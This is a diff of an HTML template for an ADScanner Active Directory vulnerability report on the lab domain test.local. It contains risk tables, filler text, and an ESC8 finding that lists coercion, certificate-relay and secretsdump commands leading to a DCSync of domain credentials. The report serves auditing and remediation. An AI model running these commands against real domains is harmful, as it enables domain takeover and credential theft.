@@ -5,29 +5,60 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>test.local Vulnerability Report</title>
     <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/x-icon" href="/Private/Report/Images/kerberos-favicon.png">
 </head>
 
 <body>
     <div class="banner">
-        <pre class="logo">
-    /\   |  __ \ / ____|                                
-   /  \  | |  | | (___   ___ __ _ _ __  _ __   ___ _ __ 
-  / /\ \ | |  | |\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
- / ____ \| |__| |____) | (_| (_| | | | | | | |  __/ |   
-/_/    \_\_____/|_____/ \___\__,_|_| |_|_| |_|\___|_|   
-
-[+] Jack G (@rootjack) https://github.com/rootjaxk/ADScanner
-  </pre>
+        <img src="./Images/kerberos-text2.png" alt="ADScanner logo" class="banner-img">
     </div>
     <div class="main-header">Domain vulnerability report for test.local</div>
+   
+    <!-- Risk overall section -->
+    <div class="risk-overall">
+        <div class="left-image">  
+                <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
+        </div>
+        <div class="risk-overall-text">
+            <h1>Domain risk level: 150 / 100</h1>
+             <p>The maximum score is 100, anything above this presents significant risk to ransomware</p>
+             <p>See score breakdown table</p>
+        </div>
+    </div>
 
-    <!-- Executive summary section -->
+
+     <!-- Executive summary section -->
     <div class="summary">
         <!-- Left section for the tables -->
         <div class="left-section">
             <div class="table-container">
-                <h3>Total risk score</h3>
-                <p>test.local = 250/100</p>
+                <table class="summary-table">
+                    <thead>
+                        <tr>
+                            <th colspan="2">Details when ran</th>
+                        </tr>
+                        <tr>
+                            <td>Ran as User</td>
+                            <td>test\jack</td>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Ran on Host</td>
+                            <td>DC.test.local</td>
+                        </tr>
+                        <tr>
+                            <td>Date and Time</td>
+                            <td>3/12/2024 5:10:30 PM</td>
+                        </tr>
+                        <tr>
+                            <td>Time to Run</td>
+                            <td>142.70629</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="table-container">
                 <table class="summary-table">
                     <thead>
                         <tr>
@@ -38,28 +69,36 @@
                     <tbody>
                         <tr>
                             <td>PKI</td>
-                            <td>150</td>
+                            <td class="category-riskcritical">100+</td>
+                        </tr>
+                        <tr>
+                            <td>Kerberos</td>
+                            <td class="category-riskhigh">75-100</td>
+                        </tr>
+                        <tr>
+                            <td>ACLs</td>
+                            <td class="category-riskhigh">75-100</td>
+                        </tr>
+                        <tr>
+                            <td>RBAC</td>
+                            <td class="category-riskmedium">50-75</td>
+                        </tr>
+                        <tr>
+                            <td>Passwords</td>
+                            <td class="category-riskmedium">25-50</td>
+                        </tr>
+                        <tr>
+                            <td>MISC</td>
+                            <td class="category-risklow">1-25</td>
+                        </tr>
+                        <tr>
+                            <td>Legacy</td>
+                            <td class="category-riskinformational">0</td>
                         </tr>
                     </tbody>
                 </table>
             </div>
-            <div class="table-container">
-                <h3>Details when ran</h3>
-                <table class="summary-table">
-                    <thead>
-                        <tr>
-                            <th>User</th>
-                            <th>Host</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td>test\jack</td>
-                            <td>DC.test.local</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
+
         </div>
         <!-- Right section for the executive summary -->
         <div class="executive-summary">
@@ -69,15 +108,16 @@
                 The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                 misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                 network could be exploited by a determined attacker deploying ransomware and malware.</p>
-            <p>The below table summarises the number and criticality of the issues found during the audit:</p>
+            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
+            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
         </div>
     </div>
-    
+
     <!-- Executive prioritisation section -->
     <div class="risk-summary-container">
         <div class="risk-summary-heading">
             <h2>Risk Prioritisation Summary</h2>
-            <p>The table below summarizes the number and criticality of findings in order of decreasing risk. Full
+            <p>The table below summarizes the number and severity of findings in order of decreasing risk. Full
                 details can be found by clicking on each vulnerability which will take you to the relevant technical
                 section.</p>
         </div>
@@ -98,7 +138,7 @@
                     <td>50</td>
                 </tr>
                 <tr class="high">
-                    <td>High</td>   
+                    <td>High</td>
                     <td><a href="#esc1"><u>ESC1</u></a></td>
                     <td>PKI</td>
                     <td>35</td>
@@ -129,6 +169,8 @@
     <div class="main-header">Technical section</div>
     <div class="finding-header">Domain info</div>
     <p></p>
+    <p>Also have table containing general domain info</p>
+
     <div class="finding-header">PKI</div>
 
     <!--Technical table-->
@@ -175,7 +217,8 @@
                                             <p>Enrolling in this certificate template allows low privileged users to
                                                 escalate their privileges to domain administrator by using a simple
                                                 python script</p>
-                                            <p><u>Links to further information</u></p>
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://example.com">Link 1</p>
                                         </td>
                                     </tr>
                                 </tbody>
@@ -189,24 +232,36 @@
                                         <td>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>1. Coercing machine authentication back to the attacking machine (192.168.10.130) can be done with printerbug.py or dfscoerce.py.</p>
-                                                    <p>python3 printerbug.py test:'Password123'@192.168.10.141 192.168.10.130</p>
-                                                    <p>python3 dfscoerece.py -u test -p 'Password123!' -d test.local 192.168.10.130 192.168.18.141</p>
+                                                    <p>1. Coercing machine authentication back to the attacking machine
+                                                        (192.168.10.130) can be done with printerbug.py or dfscoerce.py.
+                                                    </p>
+                                                    <p>python3 printerbug.py test:'Password123'@192.168.10.141
+                                                        192.168.10.130</p>
+                                                    <p>python3 dfscoerece.py -u test -p 'Password123!' -d test.local
+                                                        192.168.10.130 192.168.18.141</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ESC8/ESC-8.png" alt="Image Description">
+                                                    <img src="/Private/Report/Images/ESC8/ESC-8.png"
+                                                        alt="Image Description">
                                                 </span>
                                             </div>
                                             <hr>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>2. Authentication is then relayed to an unsecured certificate endpoint to obtain a pfx certificate for the domain controller. This is then used to replicate the behavior of a domain controller and replicate the contents of NTDS.dit via a DCSync.</p>
-                                                    <p>python3 entry.py relay -target 'http://192.168.10.141' -template DomainController</p>
+                                                    <p>2. Authentication is then relayed to an unsecured certificate
+                                                        endpoint to obtain a pfx certificate for the domain controller.
+                                                        This is then used to replicate the behavior of a domain
+                                                        controller and replicate the contents of NTDS.dit via a DCSync.
+                                                    </p>
+                                                    <p>python3 entry.py relay -target 'http://192.168.10.141' -template
+                                                        DomainController</p>
                                                     <p>python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
-                                                    <p>impacket-secretsdump 'dc$'@192.168.10.141 -hashes :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+                                                    <p>impacket-secretsdump 'dc$'@192.168.10.141 -hashes
+                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ESC8/ESC8-1.png" alt="Image Description">
+                                                    <img src="/Private/Report/Images/ESC8/ESC8-1.png"
+                                                        alt="Image Description">
                                                 </span>
                                             </div>
                                         </td>
@@ -292,7 +347,7 @@
     <p></p>
 
     <div class="finding-header">MISC</div>
-    <p></p>
+    <p>Add efficiency improvements to here</p>
 
     <div class="finding-header">Legacy</div>
     <p></p>
